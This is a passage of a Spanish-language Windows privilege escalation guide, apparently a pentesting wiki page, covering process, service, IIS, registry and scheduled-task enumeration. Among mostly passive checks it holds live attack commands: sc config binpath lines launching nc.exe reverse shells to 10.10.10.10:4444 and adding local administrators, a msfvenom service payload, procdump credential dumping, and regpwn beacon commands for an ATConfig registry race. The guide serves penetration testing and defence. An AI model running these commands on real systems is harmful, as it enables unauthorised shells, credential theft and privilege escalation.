```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Política de contraseñas

```bash
net accounts
```

### Obtener el contenido del portapapeles

```bash
powershell -command "Get-Clipboard"
```

## Procesos en ejecución

### Permisos de archivos y carpetas

En primer lugar, al listar los procesos, **comprueba si hay contraseñas en la línea de comandos del proceso**.\
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta del binario para explotar posibles [**ataques de DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Comprueba siempre si hay [**debuggers de electron/cef/chromium** en ejecución; podrías abusar de ellos para escalar privilegios](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Un listener de debugger puede estar activo durante poco tiempo, por lo que no encontrarlo en una única captura pasiva de puertos no demuestra que nunca haya estado expuesto. Relaciona cualquier listener observado con su PID, el propietario del proceso y la capacidad del usuario con menos privilegios para acceder a él; el nombre de una aplicación o un indicador de depuración, por sí solos, no demuestran que pueda ejecutarse código entre usuarios. Mantén la enumeración rutinaria en modo pasivo, en lugar de enviar comandos al debugger.

**Comprobación de los permisos de los binarios de los procesos**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Comprobación de los permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Directorios de dynamic preprocessor de Snort

Snort 2 puede cargar bibliotecas compartidas desde un `dynamicpreprocessor directory` declarado en la configuración seleccionada con `snort.exe -c <config>`. Para una tarea programada o un servicio que ejecute Snort con otra cuenta, inspecciona esa configuración exacta y los permisos ACL del directorio de módulos declarado. Si tu token puede crear archivos allí, la ruta es candidata a revisión para la ejecución de código la próxima vez que esa tarea o servicio cargue módulos. Verifica los privilegios efectivos de la cuenta de ejecución, la configuración activa, la compatibilidad de los módulos y cualquier restricción de denegación o de recursos compartidos; que un directorio permita escritura no demuestra por sí solo una escalada. La [documentación de dynamic-preprocessor de Snort](https://www.snort.org/documents/dpx-readme) describe la carga de módulos en tiempo de ejecución.

### Servicio web privilegiado con una raíz de documentos que permite escritura

En una instalación de Apache para Windows, compara la ruta del ejecutable del servicio y la cuenta con la que se ejecuta con el `DocumentRoot` de su `httpd.conf` activo. En una instalación XAMPP convencional, inspecciona `C:\xampp\apache\conf\httpd.conf` y los permisos ACL de la raíz de documentos configurada, que a menudo es `C:\xampp\htdocs`. Si un usuario con menos privilegios puede crear archivos en esa raíz mientras Apache se ejecuta como `LocalSystem`, la ejecución de código del lado del servidor podría cruzar el límite de privilegios del host. Confirma que el servicio esté en ejecución, que se sirva la ruta exacta y que un manejador del lado del servidor procese el tipo de archivo; que la raíz permita escritura por sí solo solo demuestra la creación de archivos. Inspecciona los permisos ACL sin escribir una prueba:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Para una instalación WAMP convencional, el servicio puede apuntar a un `C:\wamp64\bin\apache\apache*\bin\httpd.exe` versionado (o a `C:\wamp\...` en una estructura de 32 bits), con la configuración en `conf\httpd.conf`, junto a ese archivo, y una raíz predeterminada en `C:\wamp64\www` o `C:\wamp\www`. Comprueba en conjunto la imagen exacta del servicio, la identidad con la que se ejecuta, el `DocumentRoot` efectivo (incluida la expansión de `${INSTALL_DIR}` y las sobrescrituras de los virtual hosts) y la ACL de la raíz. Que un directorio WAMP permita escritura no demuestra que Apache se ejecute como `SYSTEM` ni que ejecute el archivo enviado. [Apache documenta cómo un servicio de Windows selecciona su configuración](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Raíz de IIS con permisos de escritura e identidad de red del grupo de aplicaciones

En IIS, relaciona un directorio físico con permisos de escritura con un **sitio/aplicación activo** en `applicationHost.config` y, después, identifica su grupo configurado y el controlador del lado del servidor. El código colocado en un directorio servido se ejecuta como el grupo solo si IIS procesa ese tipo de archivo y la ruta es accesible. Antes de considerar que un directorio con permisos de escritura permite ejecutar código, comprueba los permisos efectivos del usuario actual para crear archivos, el estado de ejecución del sitio, el controlador y las sobrescrituras por ruta.

La compilación dinámica de ASP.NET introduce otra ruta que conviene revisar: los archivos generados en el directorio de compilación de la aplicación. De forma predeterminada, se trata de un directorio `Temporary ASP.NET Files` bajo la instalación pertinente de .NET Framework, pero `<compilation tempDirectory>` de la aplicación puede cambiarlo. [Microsoft documenta la ubicación y los subdirectorios por aplicación](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) y [recomienda aislar los directorios de compilación cuando los grupos de aplicaciones no confían unos en otros](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Si un token con menos privilegios puede modificar el código fuente generado en la caché de la **aplicación específica**, determina si esa aplicación lo vuelve a compilar con una [identidad de proceso de trabajo](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) más privilegiada. Una ACL de archivo o directorio por sí sola no demuestra que se ejecute código: relaciona la caché con la aplicación activa, el token y la ACL efectivos, la configuración de compilación, la identidad del proceso y el momento de cualquier recompilación. Revisa los metadatos en modo de solo lectura; no actives la compilación ni modifiques archivos de la caché durante la enumeración.

Un grupo de IIS configurado como `ApplicationPoolIdentity` o `NetworkService` suele autenticarse en los recursos del dominio como la **cuenta de equipo host**, aunque su token local tenga pocos privilegios. `LocalSystem` ya tiene muchos privilegios localmente y también usa la cuenta de equipo en la red; `LocalService` normalmente presenta credenciales de red anónimas. Un grupo `SpecificUser` usa la cuenta configurada para este. [Microsoft documenta estos tipos de identidad](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) y [la identidad de red del grupo de aplicaciones](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Si se omite la configuración de identidad, se pueden heredar los valores predeterminados del grupo, que varían según la generación de IIS; por eso, resuelve la configuración efectiva en vez de deducirla del nombre del grupo. Si se consigue ejecutar código en un grupo cuya identidad de red es la cuenta del equipo, evalúa los permisos de directorio de **ese equipo específico**. [DCSync](../active-directory-methodology/dcsync.md) requiere permisos de replicación en el contexto de nomenclatura del dominio; un ticket de cuenta de equipo o el rol del host por sí solos no los demuestran. La enumeración pasiva debe revisar la configuración y las ACL sin subir archivos, autenticarse en la red ni solicitar tickets.

Para un controlador ASP.NET legible que inicia un proceso auxiliar, sigue cualquier valor derivado de la solicitud a través de la autenticación, el descifrado, la validación y la construcción del comando. Un controlador que concatena un token descodificado en `ProcessStartInfo("cmd", "/c ...")` podría permitir que los metacaracteres del shell alteren el comando; [Microsoft documenta los caracteres especiales de `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Comprueba que una persona que llama sin confianza pueda realmente influir en el valor descodificado y acceder al controlador; después, determina la identidad efectiva del grupo de aplicaciones o de la suplantación, así como la identidad del proceso secundario. Una línea de código fuente legible, un listener en localhost o una debilidad en el formato del token por sí solos no demuestran la ejecución de comandos privilegiados. Revisa el código fuente y la configuración del grupo sin enviar solicitudes falsificadas ni ejecutar el proceso auxiliar durante la enumeración pasiva.

En un servicio PHP en Windows, una ruta controlada por la solicitud y pasada a [`include` o `require`](https://www.php.net/manual/en/function.include.php) puede evaluar un archivo PHP modificable por un usuario con menos privilegios, bajo la identidad del worker. Confirma que la solicitud pueda llegar a esa instrucción, que la ruta resuelta apunte a un archivo que el usuario con menos privilegios pueda modificar y que el worker pueda leer, que las restricciones de ruta de PHP aplicables permitan la inclusión y que el worker se ejecute realmente con más privilegios. Un listener de loopback o un archivo con permisos de escritura por sí solos no demuestran esta cadena; inspecciona el código fuente, la identidad del servicio y las ACL de los archivos sin invocar el endpoint durante la enumeración pasiva.

### Minería de contraseñas en memoria

Puedes crear un volcado de memoria de un proceso en ejecución con **procdump** de sysinternals. Servicios como FTP tienen las **credenciales en texto plano en memoria**; prueba a volcar la memoria y leer las credenciales.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir que un usuario inicie un CMD o explore directorios.**

Ejemplo: "Ayuda y soporte técnico de Windows" (Windows + F1), busca "command prompt" y haz clic en "Click to open Command Prompt"

### Importación de archivos de proyecto con privilegios

Una aplicación que abre automáticamente proyectos desde un directorio de entrega en el que puede escribir un usuario de menor nivel cruza un límite de confianza de entrada bajo la cuenta del importador. Revisa la **ruta exacta en la que se puede escribir**, el proceso o la tarea que la abre, su identidad efectiva y la versión del parser. Un [problema histórico al abrir o restaurar proyectos de Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) permitía el uso de entidades externas XML en los metadatos del proyecto; una entidad de red en Windows podía provocar la autenticación de la cuenta que importaba si las [políticas de SMB saliente y NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) lo permitían. Esto es una pista de exposición de credenciales, no acceso inmediato de administrador: la respuesta debe poder aprovecharse a través de una ruta independiente autorizada o vulnerable, y las versiones actuales deben evaluarse según su estado real de parches. No abras un proyecto diseñado para explotar una vulnerabilidad durante la enumeración pasiva; inspecciona el flujo de importación y las ACL.

## Servicios

El derecho [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) del objeto Service Control Manager (SCM) es independiente de los derechos sobre un servicio existente. Una solicitud de acceso de solo lectura [`OpenSCManager` correcta](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) para ese derecho es una pista que conviene revisar, no una prueba de que se pueda ejecutar un servicio nuevo. [`CreateService` devuelve un identificador](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) con los derechos de acceso al servicio solicitados al crearlo; volver a abrir el servicio más tarde realiza una comprobación de acceso independiente y puede fallar aunque se pudiera usar el identificador original. Verifica por separado el token local o remoto efectivo, los derechos concedidos al identificador, la cuenta del servicio, la política de inicio y la ruta del ejecutable. No crees ni inicies un servicio durante la enumeración pasiva.

En una ruta de instalación de servicios remota, correlaciona esos derechos del SCM con un recurso compartido del destino en el que **el mismo inicio de sesión de red** pueda escribir, su ACL de NTFS subyacente y una ruta local al ejecutable que la cuenta del servicio pueda ejecutar. Una cuenta no administrativa puede cruzar este límite si existen derechos del SCM inusualmente amplios y la ruta para colocar el archivo; un recurso compartido administrativo no es un requisito inherente. Tener acceso de escritura al recurso compartido, o una pista de permisos para crear servicios en el SCM, por sí solo no demuestra que el nuevo servicio pueda iniciarse con una identidad de mayor nivel.

Un servicio existente puede invocar un ejecutable auxiliar al iniciarse, detenerse o durante otro evento del ciclo de vida, aunque ese auxiliar no aparezca en su `ImagePath`. Si el nombre del auxiliar se resuelve en un directorio en el que puede escribir un usuario de menor nivel y el servicio se ejecuta con una identidad de mayor nivel, la ausencia del archivo auxiliar es una posible oportunidad de reemplazo, sujeta a ciertas condiciones. Confirma el **código real del servicio o la invocación documentada del auxiliar**, la ruta del ejecutable resuelta y el orden de búsqueda, los permisos para crear directorios, la identidad del servicio y la disponibilidad de un evento que lo active. Un directorio del servicio en el que se pueda escribir o la ausencia de un archivo, por sí solos, no demuestran que el servicio cargue ese archivo; una revisión pasiva no debe iniciar ni detener el servicio.

En un servicio existente, [`SERVICE_START permite proporcionar argumentos a `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); es distinto de [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Revisa el código del servicio o su interfaz documentada antes de considerar que el permiso de inicio sea algo más que un derecho de control. Si utiliza un argumento elegido por quien llama como ruta de registro o exportación, verifica la identidad del servicio, el flujo exacto del argumento hasta la escritura, las restricciones de ruta y los permisos del **archivo creado**. Una escritura en un directorio protegido solo puede convertirse en una escalada si existe otro consumidor o cargador con privilegios que acepte ese archivo; un registro en el que se pueda escribir o el derecho de inicio, por sí solos, no bastan. El inventario pasivo no debe iniciar el servicio ni crear un archivo de prueba.

Para un agente de monitorización NSClient++, que se pueda leer `nsclient.ini` es una **pista para revisar la configuración**: puede contener credenciales web, mientras que `boot.ini` puede redirigir la configuración a otra ubicación. Comprueba la cuenta real del servicio, el listener WEB y la política de acceso, y si el rol autenticado puede cambiar la configuración o los scripts. La ejecución con privilegios también requiere `CheckExternalScripts` (u otra ruta de ejecución habilitada), un derecho efectivo para registrar o modificar un comando y un mecanismo que lo active bajo la identidad del servicio. Un listener limitado a loopback puede seguir siendo accesible para un usuario local, pero la ruta del archivo, la contraseña o el listener, por sí solos, no demuestran que existan esos derechos. Revisa los metadatos y permisos sin mostrar secretos ni invocar la API web durante la enumeración pasiva. Consulta la [distribución de archivos de NSClient++](https://nsclient.org/docs/concepts/file-layout/), las [directrices de seguridad para web y scripts](https://nsclient.org/docs/setup/securing/) y la [configuración de scripts externos](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Para un servicio cuyo `ImagePath` sea `nssm.exe`, inspecciona la cuenta real con la que se ejecuta el servicio y su valor `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM almacena ahí la aplicación secundaria](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), mientras que `AppDirectory` es el directorio de trabajo configurado. Revisa el ejecutable secundario y las ACL de su directorio padre antes de considerar que los permisos del wrapper describen por completo el límite del servicio. Un endpoint WCF o SOAP local expuesto por ese proceso secundario es una pista independiente que conviene revisar: confirma que el usuario con menos privilegios pueda acceder al listener, que la operación exacta acepte su entrada y que el proceso secundario del servicio ejecute la operación insegura con una identidad de mayor nivel. La cuenta del servicio, una URL de endpoint o una ruta en la que se pueda escribir, por sí solas, no demuestran una escalada; evita invocar operaciones del servicio durante la enumeración pasiva.

Para una operación WCF personalizada, rastrea una cadena controlada por quien llama hasta cualquier runspace de PowerShell. [`Pipeline.Commands.AddScript` agrega texto de script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), y [`Pipeline.Invoke` ejecuta el pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Un [`netTcpBinding` con credenciales de transporte de Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentica al cliente, pero la autorización para llamar a esa **operación específica** y la identidad efectiva del runspace deben comprobarse por separado. Una ruta desde la entrada de un usuario con menos privilegios hasta `AddScript`, ejecutada bajo una identidad de servicio de mayor nivel, constituye un límite de ejecución de código; un puerto en escucha, un cliente autenticado o un método sin uso en un ensamblado no relacionado no son prueba por sí solos. Revisa estáticamente el servicio desplegado, el contrato, la autorización y la configuración de suplantación, sin invocar el endpoint durante la enumeración.

Los Service Triggers permiten que Windows inicie un servicio cuando se producen ciertas condiciones (actividad de una named pipe o un endpoint RPC, eventos ETW, disponibilidad de IP, llegada de un dispositivo, actualización de GPO, etc.). Incluso sin derechos SERVICE_START, a menudo es posible iniciar servicios con privilegios activando sus triggers. Consulta aquí las técnicas de enumeración y activación:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Servicio de recopilación de diagnósticos de Visual Studio

Las instalaciones de Visual Studio con herramientas de C/C++ pueden incluir `VSStandardCollectorService150`, un servicio de diagnóstico configurado para ejecutarse como `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) utilizó una junction y una condición de carrera con un object-manager link para redirigir el restablecimiento de una DACL del servicio. La escalada demostrada también requería una ruta de reparación MSI utilizable del proveedor WMI de Visual Studio Setup y el destino `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. El componente se corrigió en enero de 2024.

Para un análisis pasivo inicial, inspecciona la cuenta y la ruta del binario de ese servicio, comprueba si existe la ruta del compilador de Setup WMI y verifica el estado de los parches del componente instalado. Una entrada de servicio, la versión del producto Visual Studio o un archivo del compilador, por sí solos, no demuestran que el host sea vulnerable. La inspección no requiere iniciar el servicio ni ejecutar una reparación.

Obtén una lista de servicios:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permisos

Puedes usar **sc** para obtener información de un servicio.

```bash
sc qc <service_name>
```

Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegios requerido para cada servicio.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Se recomienda comprobar si "Authenticated Users" puede modificar algún servicio:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Puede descargar accesschk.exe para XP aquí](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar el servicio

Si aparece este error (por ejemplo, con SSDPSRV):

_Error del sistema 1058._\
_No se puede iniciar el servicio porque está deshabilitado o porque no tiene ningún dispositivo habilitado asociado._

Puede habilitarlo usando

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Ten en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1)**

**Otra solución alternativa** a este problema es ejecutar:

```
sc.exe config usosvc start= auto
```

### **Modificar la ruta del binario del servicio**

En el escenario en el que el grupo «Usuarios autenticados» tiene **SERVICE_ALL_ACCESS** en un servicio, es posible modificar el binario ejecutable del servicio. Para modificarlo y ejecutar `sc`:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Reiniciar servicio

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Los privilegios se pueden escalar mediante varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binario del servicio.
- **WRITE_DAC**: Permite reconfigurar los permisos, lo que posibilita cambiar la configuración del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar los permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar la configuración del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar la configuración del servicio.

Para detectar y explotar esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Permisos débiles en los binarios de servicios

Si un servicio se ejecuta como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o una cuenta de dominio privilegiada, pero los **usuarios con pocos privilegios pueden modificar el EXE del servicio o su carpeta principal**, a menudo se puede secuestrar el servicio **reemplazando el binario y reiniciando el servicio**.

**Comprueba si puedes modificar el binario que ejecuta un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener todos los binarios que ejecuta un servicio mediante **wmic** (no en system32) y comprobar tus permisos con **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

También puedes usar **sc** e **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Busca ACL peligrosas asignadas a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** o **`(W)`** en el ejecutable del servicio o en el directorio que lo contiene. Un flujo práctico de abuso es:<sup>[[27]](#references)</sup>

1. Confirma la cuenta del servicio y la ruta del ejecutable con `sc qc <service_name>`.
2. Confirma que se puede escribir en el binario con `icacls <path>`.
3. Reemplaza el binario del servicio por un payload o un binario de servicio malicioso válido.
4. Reinicia el servicio con `sc stop <service_name> && sc start <service_name>` (o espera a que se reinicie el sistema o se active un desencadenador del servicio).

Comprobaciones automatizadas útiles:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Si el servicio no permite que un usuario normal lo reinicie, comprueba si se inicia automáticamente al arrancar el sistema, si tiene una acción de error que lo vuelve a iniciar o si la aplicación que lo usa puede activarlo indirectamente.

### Permisos para modificar el registro de servicios

Deberías comprobar si puedes modificar alguna clave del registro de servicios.\
Puedes **comprobar** tus **permisos** sobre la **clave del registro** de un servicio haciendo lo siguiente:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Revisa si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** tienen permisos de escritura en la clave de registro de un servicio específico. Una entrada de ACL por sí sola no demuestra que el acceso sea efectivo: importan las entradas de denegación, el token actual y los permisos heredados. Los derechos sobre la clave de registro son distintos de los derechos `SERVICE_CHANGE_CONFIG` y `SERVICE_START` del objeto de servicio. La escalada también requiere un campo de configuración del servicio que se pueda usar, una forma de iniciar el servicio y una identidad de servicio con más privilegios. Consulta los [derechos de las claves de registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) y la [referencia de derechos de acceso a servicios](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) de Microsoft.

Para cambiar la ruta del binario ejecutado:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race de symlink del registro para escribir un valor arbitrario en HKLM (ATConfig)

Algunas características de Accesibilidad de Windows crean claves **ATConfig** por usuario que luego un proceso **SYSTEM** copia en una clave de sesión de HKLM. Una **race de symlink** del registro puede redirigir esa escritura privilegiada a **cualquier ruta de HKLM**, lo que proporciona una primitiva de **escritura de valor** arbitrario en HKLM.<sup>[[18]](#references)</sup>

Ubicaciones clave (ejemplo: Teclado en pantalla `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` enumera las características de accesibilidad instaladas.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` almacena la configuración controlada por el usuario.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se crea durante el inicio de sesión o las transiciones al escritorio seguro, y el usuario puede escribir en ella.

Flujo de explotación (CVE-2026-24291 / ATConfig):

1. Establece el valor de **HKCU ATConfig** que quieres que SYSTEM escriba.
2. Activa la copia al escritorio seguro (por ejemplo, con **LockWorkstation**), lo que inicia el flujo del broker de AT.
3. **Gana la race** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando se activa el oplock, reemplaza la clave **HKLM Session ATConfig** por un **registry link** a un destino protegido de HKLM.
4. SYSTEM escribe el valor elegido por el atacante en la ruta redirigida de HKLM.

Una vez que tengas escritura arbitraria de valores en HKLM, pivota a LPE sobrescribiendo los valores de configuración de un servicio:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/línea de comandos)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Elige un servicio que un usuario normal pueda iniciar (por ejemplo, **`msiserver`**) y actívalo después de la escritura. **Nota:** la implementación pública del exploit **bloquea la estación de trabajo** como parte de la race.

Herramientas de ejemplo (RegPwn BOF / independiente):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Permisos AppendData/AddSubdirectory en el registro de Services

Si tienes este permiso sobre un registro, significa que **puedes crear subregistros a partir de este**. En el caso de los servicios de Windows, esto es **suficiente para ejecutar código arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada ruta que termine antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_, Windows intentará ejecutar:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Lista todas las rutas de servicio sin comillas, excluyendo las que pertenecen a servicios integrados de Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Acciones de recuperación

Windows permite a los usuarios especificar las acciones que se deben realizar si un servicio falla. Esta función se puede configurar para que apunte a un binario. Si se puede reemplazar este binario, podría ser posible escalar privilegios. Encontrarás más detalles en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Scripts objetivo de tareas programadas

En una tarea habilitada que ejecuta `cmd.exe /c` con un archivo `.bat` o `.cmd`, comprueba el script indicado en los **argumentos de la acción**, además de `cmd.exe`. Lo mismo se aplica al argumento de archivo explícito de un intérprete, como PowerShell `-File`. Si un archivo batch programado contiene una llamada literal a PowerShell `-File`, revisa también la ACL del script indicado; las variables, las condicionales y el encadenamiento de comandos requieren un análisis manual. Un script o directorio principal en el que quien lo ejecuta pueda escribir solo constituye una vía para ejecutar código con otra cuenta si la tarea está configurada con una cuenta distinta de la del usuario y realmente llega a esa acción. Una ACL que solo permita agregar contenido puede ser relevante para los scripts, pero un `exit` anterior u otro flujo de control puede impedir que se ejecuten las líneas agregadas. Confirma las ACL efectivas, el [contexto de ejecución de la tarea](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), el directorio de trabajo, el trigger y la política de control de aplicaciones antes de afirmar que es posible escalar privilegios. La enumeración no debe modificar el script ni iniciar la tarea.

## Streams con nombre en archivos accesibles

En NTFS, un archivo legible puede tener un stream con nombre `:$DATA` cuyo contenido no aparece en un listado de directorio normal. Para un conjunto pequeño y relevante de archivos de configuración o copias de seguridad accesibles, revisa los **nombres y tamaños** de los streams antes de abrir su contenido; Windows permite consultarlos mediante [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) y PowerShell mediante [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Un nombre de stream que sugiera que contiene un secreto es solo una pista. Comprueba el acceso de lectura efectivo al archivo, si el sistema de archivos admite streams, si el stream contiene credenciales utilizables y con qué cuenta se autentican realmente. Evita los análisis recursivos de streams y mostrar su contenido durante la enumeración rutinaria.

